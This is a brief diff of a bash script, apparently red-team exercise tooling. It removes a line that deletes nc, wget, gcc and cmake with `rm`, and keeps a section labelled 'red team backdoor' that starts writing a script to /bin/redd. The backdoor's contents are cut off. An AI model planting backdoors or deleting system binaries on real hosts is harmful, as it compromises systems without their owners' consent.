@@ -1,8 +1,4 @@
 #!/bin/bash
-
-# Remove nc, gcc and other compilers
-rm `which nc` `which wget` `which gcc` `which cmake` 2>/dev/null
-
 # red team backdoor
 cat << 'EOF' > /bin/redd
 #!/bin/bash
